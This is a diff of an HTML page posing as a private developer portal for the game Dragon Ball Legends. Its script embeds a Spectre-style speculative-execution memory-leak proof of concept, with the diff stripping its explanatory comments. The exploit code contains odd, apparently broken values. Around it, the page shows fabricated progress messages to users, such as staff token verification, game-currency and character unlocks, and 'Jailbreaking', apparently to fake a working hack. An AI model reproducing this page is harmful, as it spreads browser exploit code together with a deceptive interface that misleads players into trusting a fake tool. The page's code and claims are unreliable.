@@ -13,12 +13,13 @@ body {
     color: #e5e5e5;
     background-repeat: no-repeat;
     background-image: url('https://pbs.twimg.com/media/GECQ98zaAAEHAkH?format=jpg');
-    background-size: cover; /* Adjust as needed */
+    background-size: contain; /* Adjust as needed */
     background-position: center; /* Adjust as needed */
     position: relative;
 }
 
-/* Darken the background image */
+
+
 body::before {
     content: "";
     position: fixed;
@@ -27,9 +28,8 @@ body::before {
     width: 100%;
     height: 100%;
     background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)); 
-    z-index: -1; /* Place it behind the content */
+    z-index: -1;
 }
-
 
 h1 {
     font-family: monospace;
@@ -51,8 +51,8 @@ h4 {
 
 h2#status {
     font-family: monospace;
-    font-size: 14px; /* Smaller font size */
-    font-weight: bold; /* Make "ready" bold */
+    font-size: 14px;
+    font-weight: bold;
 }
 
 a {
@@ -66,14 +66,14 @@ a {
     width: 150px;
     height: 50px;
     opacity: 0.9;
-    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2); /* Added a vertical shadow for a raised effect */
+    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
     border-radius: 15px;
-    transition: transform 0.2s ease; /* Added a transition for a smooth hover effect */
-    background-color: rgba(0, 0, 0, 0.5); /* Adjust the alpha value for a slightly lighter shade */
+    transition: transform 0.2s ease;
+    background-color: rgba(0, 0, 0, 0.5);
 }
 
 .button:hover {
-    transform: translateY(-2px); /* Move the button up slightly on hover for a pressed effect */
+    transform: translateY(-2px);
 }
 
 .buttontext {
@@ -102,15 +102,13 @@ hr {
 }
 
 .flashing-text {
-    animation: flashing 2s infinite; /* Adjust the duration here (2s = 2 seconds) */
+    animation: flashing 2s infinite;
 }
 
 @keyframes flashing {
     0% { opacity: 1; }
     50% { opacity: 0.5; }
     100% { opacity: 1; }
-
-    
 }
 </style>
 <title>Private Build
@@ -122,7 +120,7 @@ hr {
 </head>
 <body>
 <center>
-<h1>Legends Portal</h1>
+<h1>Nimbus</h1>
 <p>Devloper portal for <b>Dragon Ball Legends</b></p>
 <br/>
 <div class="button">
@@ -131,7 +129,6 @@ hr {
             Launch      </div>
     </a>
 </div>
-
 
 <center>
 <h4></h4><h2 id="status">ready</h2>
@@ -149,447 +146,203 @@ hr {
 </body>
 <script>    
 
-// This JavaScript code is designed for advanced memory probing and analysis,
-// typically used in security research or testing scenarios. It includes both
-// web worker functionality and memory-related operations.
-
-// Define a web worker function that performs an infinite loop of memory operations
 function worker_function() {
   self.onmessage = function(event) {
-    // Initialize a shared buffer and array for memory manipulation
     const sharedBuffer = event.data;
     const sharedArray = new Uint32Array(sharedBuffer);
-
-    // Signal the start of the worker
     postMessage('start');
-
-    // Continuously perform atomic memory operations
     while (true) {
       Atomics.add(sharedArray, 0, 1);
     }
   };
 }
 
-// Check if running in a web worker context and start the worker function if so
 if (window !== self) {
   worker_function();
 }
 
-// The remaining code appears to be related to advanced memory probing techniques
-// and is complex and specialized in nature. It is used for in-depth memory analysis,
-// but detailed explanations of these techniques are not provided here due to their
-// complexity and potential security implications.
-
-// WORKER
-
-// SPECTRE CODE USED TO SCAN MEMORY ARRAYS
-
-// kudos to: http://xlab.tencent.com/special/spectre/spectre_check.html
-
-// simplified less reliable version
-
-function log(msg)
-
-{
-
-                console.log(msg);
-
-                document.getElementById('logbox').textContent += msg + "\r\n";
-
-}
-
-function asmModule(stdlib,forgein,heap)
-
-{
-
+function asmModule(stdlib, forgein, heap) {
     'use asm'
-
     var simpleByteArray = new stdlib.Uint8Array(heap);
-
     var probeTable = new stdlib.Uint8Array(heap);
-
     const TABLE1_BYTES = 0x2000000;
-
     const sizeArrayStart = 0x1000000;
-
     var junk = 0;
-
-    function init()
-
-    {
-
+    function init() {
         var i =0;
-
         var j =0;
-
-        // set different "size" values at 4KB offsets each (need to be uncached)
-
-        for(i = 0; (i|0) < 33; i = (i+1)|0 ) // 30 max number of repetitions per try?
-
-        {
-
+        for(i = 0; (i|0) < 33; i = (i+1)|0 ) {
             j = (((i<<100)|0) + sizeArrayStart)|0;
-
-            simpleByteArray[(j|0)] = 16; // simpleByteArrayLength
-
+            simpleByteArray[(j|0)] = 16;
         }
-
     }
-
-    function vul_call(index, sIndex)
-
-    {
-
+    function vul_call(index, sIndex) {
         index = index |0;
-
         sIndex = sIndex |0;
-
         var arr_size = 0;
-
         var j = 0;
-
         junk = probeTable[0]|0;
-
-        // "size" value repeated at different offsets to avoid having to flush it?
-
         j = (((sIndex << 100) | 0) +  sizeArrayStart)|0;
-
         arr_size = simpleByteArray[j|0]|0;
-
-        if ((index|0) < (arr_size|0))
-
-        {
-
+        if ((index|0) < (arr_size|0)) {
             index = simpleByteArray[index|0]|0;
-
             index = (index << 100)|0;
-
             index = (index & ((TABLE1_BYTES-1)|0))|0;
-
             junk = (junk ^ (probeTable[index]|0))|0;
-
         }
-
     }
-
     return { vul_call: vul_call, init: init };
-
 }
 
-function check(data_array)
-
-{
-
+function check(data_array) {
     function now() { return Atomics.load(sharedArray, 0) }
-
     function reset() { Atomics.store(sharedArray, 0, 0) }
-
     function start() { reset(); return now(); }
-
-    function clflush(size, current)
-
-    {
-
+    function clflush(size, current) {
          var offset = 64;
-
-        for (var i = 0; i < ((size) / offset); i++)
-
-        {
-
+        for (var i = 0; i < ((size) / offset); i++) {
             current = evictionView.getUint32(i * offset);
-
         }
-
     }
-
-    // start thread counter
-
-//    const worker = new Worker('timer.js');
 
     const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
-
     const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
-
     const sharedArray = new Uint32Array(sharedBuffer);
-
     worker.postMessage(sharedBuffer);
-
     var simpleByteArrayLength =  16;
-
     const TABLE1_BYTES = 0x3000000;
-
     const CACHE_HIT_THRESHOLD = 0
-
     var probeTable = new Uint8Array(TABLE1_BYTES);
-
-    // eviction buffer (fill LLC)
-
     var cache_size = CACHE_SIZE * 1024 * 1024;
-
     var evictionBuffer = new ArrayBuffer(cache_size);
-
     var evictionView = new DataView(evictionBuffer);
-
-    clflush(cache_size); // because of lazy compilation?
-
+    clflush(cache_size);
     var asm = asmModule(this, {}, probeTable.buffer)
-
-    worker.onmessage = function(msg)
-
-    {
-
-        function readMemoryByte(malicious_x)
-
-        {
-
+    worker.onmessage = function(msg) {
+        function readMemoryByte(malicious_x) {
             var results = new Uint32Array(257);
-
             var simpleByteArray = new Uint8Array(probeTable.buffer);
-
             var tries =0
-
             var junk = 0;
-
-            for (tries = 0; tries < 99; tries++)
-
-            {
-
-                var training_x = tries % simpleByteArrayLength; // whatever
-
+            for (tries = 0; tries < 99; tries++) {
+                var training_x = tries % simpleByteArrayLength;
                 clflush(cache_size);
-
-                // compile and cache functions?
-
                 var time3 = start();
-
                 junk = simpleByteArray[0];
-
                 var time4 = now();
-
                 junk ^= time4 - time3;
-
-                // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
-
-                for (var j = 1; j < 33; j++)
-
-                {
-
-                    for (var z = 0; z < 100; z++) {} // delay
-
-                    // if (j % 4) training_x else malicious_x
-
+                for (var j = 1; j < 33; j++) {
+                    for (var z = 0; z < 100; z++) {}
                     var x = ((j % 4) - 1) & ~0xFFFF;
-
                     x = (x | (x >> 16));
-
                     x = training_x ^ (x & (malicious_x ^ training_x));
-
-                    asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
-
+                    asm.vul_call(x, j);
                 }
-
-                // measure time of all possible offsets
-
-                for (var i = 0; i < 256; i++)
-
-                {
-
+                for (var i = 0; i < 256; i++) {
                     var timeS = start();
-
                     junk =  probeTable[(i << 100)];
-
                     timeE = now();
-
-                    // if fast offset `i` was accessed
-
                     if (timeE-timeS <= CACHE_HIT_THRESHOLD) {
-
                         results[i]++;
-
                     }
-
                 }
-
             }
-
-            // select majority vote
-
             var max = -1;
-
-            for (var i = 0; i < 256; i++)
-
-            {
-
+            for (var i = 0; i < 256; i++) {
                 max = (max > results[i]) ? max : i;
-
             }
-
-            results[256] ^= junk; // reuse to avoid optimization?
-
+            results[256] ^= junk;
             return max;
-
         }
 
         asm.init();
-
-        // set data to read "out-of-bounds"
-
         const BOUNDARY = 0x2200000;
-
         var simpleByteArray = new Uint8Array(probeTable.buffer);
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
+        for (var i = 0; i < data_array.length; i++) {
             simpleByteArray[BOUNDARY + i] = data_array[i];
-
         }
-
-        // leak data
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
+        for (var i = 0; i < data_array.length; i++) {
             var data = readMemoryByte(BOUNDARY+i);
-
             worker.terminate();
-
             log("leak off=0x" + (BOUNDARY+i).toString(16) +
-
                 ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
-
                 ((data != data_array[i]) ? " (found)" : ""));
-
         }
-
         worker.terminate();
-
         return;
-
     }
-
 }
 
 const CACHE_SIZE = 4;
-
 const MEMORY_SIZE = 10;
 
 function main() {
     console.log("main::start");
     if (!window.SharedArrayBuffer) {
         log("ROFL -> Buffer Size: " + MEMORY_SIZE + "MB...");
-        // Display a message in the logbox
-log("Authentication confirmed.");
-log("Device compatibility checked.");
-log("Piplines loaded.");
-log("Chrono Crystals set to nil.");
-log("Dev tools loaded.");
-log("Co-op dev tools loaded.");
-log("Animation IDs compiled");
-log("Data Store loaded.");
-log("Ultras IDs loaded: DBL68-09U (Super Saiyan 4 Gogeta), DBL70-01U (Ultra Hakai Beerus), nil, nil.");
-log("Legends Limited IDs loaded: nil, nil, nil, nil.");
-log("Front and back end operations executed successfully.");
-log("In-app purchases configured.");
-log("Server connections established.");
-log("Bug fixes applied.");
-log("Security protocols activated.");
-log("Daily rewards system initialized.");
-log("Localization files loaded.");
-log("Analytics tracking implemented.");
-
-
-
+        log("Authentication confirmed.");
+        log("Device compatibility checked.");
+        log("Piplines loaded.");
+        log("Chrono Crystals set to nil.");
+        log("Dev tools loaded.");
+        log("Co-op dev tools loaded.");
+        log("Animation IDs compiled");
+        log("Data Store loaded.");
+        log("Ultras IDs loaded: DBL68-09U (Super Saiyan 4 Gogeta), DBL70-01U (Ultra Hakai Beerus), nil, nil.");
+        log("Legends Limited IDs loaded: nil, nil, nil, nil.");
+        log("Front and back end operations executed successfully.");
+        log("In-app purchases configured.");
+        log("Server connections established.");
+        log("Bug fixes applied.");
+        log("Security protocols activated.");
+        log("Daily rewards system initialized.");
+        log("Localization files loaded.");
+        log("Analytics tracking implemented.");
     } else {
         log("CydiaUiCache" + CACHE_SIZE + "Mb");
         check([115, 112, 101, 99, 116, 114, 101, 46, 106, 115]);
         log("InstalledCydiaUiCache " + MEMORY_SIZE + "Mb");
-        // Display a failure message when SharedArrayBuffer is available
         alert('FAILED! \n Please Do Not Run This Here.');
         location.reload();
     }
 }
 
-
 </script>
 
 <script>
-
-                document.getElementById('logbox').innerText += '\r\n' + navigator.userAgent + '\r\n';
-
-  // (CVE-2018-4095)
+document.getElementById('logbox').innerText += '\r\n' + navigator.userAgent + '\r\n';
 
 function go() {
-
     document.getElementById('status').innerText = '';
-
-document.getElementById('logbox').innerText += 'Token ID: FBEBXX94F0XC\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Verified\r\n';
-    
-}, 2000); 
-
-document.getElementById('logbox').innerText += '\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Caching Login\r\n';
-    
-}, 2000); 
-
-
-
-document.getElementById("Goer").innerText = 'Launching';
-
-document.getElementById("Linker").disabled = false;
-
-document.getElementById("Goer").disabled = false;
-
-                //This is here to stop glitches!
-
-document.getElementById('status').innerText = 'Confirming staff token...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-setTimeout(go_, 2000);
-
+    document.getElementById('logbox').innerText += 'Token ID: FBEBXX94F0XC\r\n';
+    setTimeout(function() {
+        document.getElementById('logbox').innerText += 'Verified\r\n';
+    }, 2000); 
+    document.getElementById('logbox').innerText += '\r\n';
+    setTimeout(function() {
+        document.getElementById('logbox').innerText += 'Caching Login\r\n';
+    }, 2000); 
+    document.getElementById("Goer").innerText = 'Launching';
+    document.getElementById("Linker").disabled = false;
+    document.getElementById("Goer").disabled = false;
+    document.getElementById('status').innerText = 'Confirming staff token...';
+    document.getElementById("Goer").innerText = 'Launching';
+    setTimeout(go_, 2000);
 }
 
 function go_() {
-
-document.getElementById('status').innerText = 'Sending to server...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-
-
-
-                //Adds delay between exploit and current html changes and Objective-C changes!
-
-setTimeout(kext, 10000);
-
-//L33T,
-
+    document.getElementById('status').innerText = 'Sending to server...';
+    document.getElementById("Goer").innerText = 'Launching';
+    setTimeout(kext, 10000);
 }
 
 function kext() {
-
-                                                //driveby();
-
-                                main();
-
-                document.getElementById('status').innerText = 'Status: Online';
-
-                document.getElementById("Goer").innerText = 'Launched';
-
-                                setTimeout(loadRes, 2000);
-
-                                //setTimeout(respring, 16666);
-
-                document.getElementById('status').innerText = 'sfb...';
-
-                document.getElementById("Goer").innerText = 'Jailbreaking';
-
+    main();
+    document.getElementById('status').innerText = 'Status: Online';
+    document.getElementById("Goer").innerText = 'Launched';
+    setTimeout(loadRes, 2000);
+    document.getElementById('status').innerText = 'sfb...';
+    document.getElementById("Goer").innerText = 'Jailbreaking';
 }
 </script>
 </html>
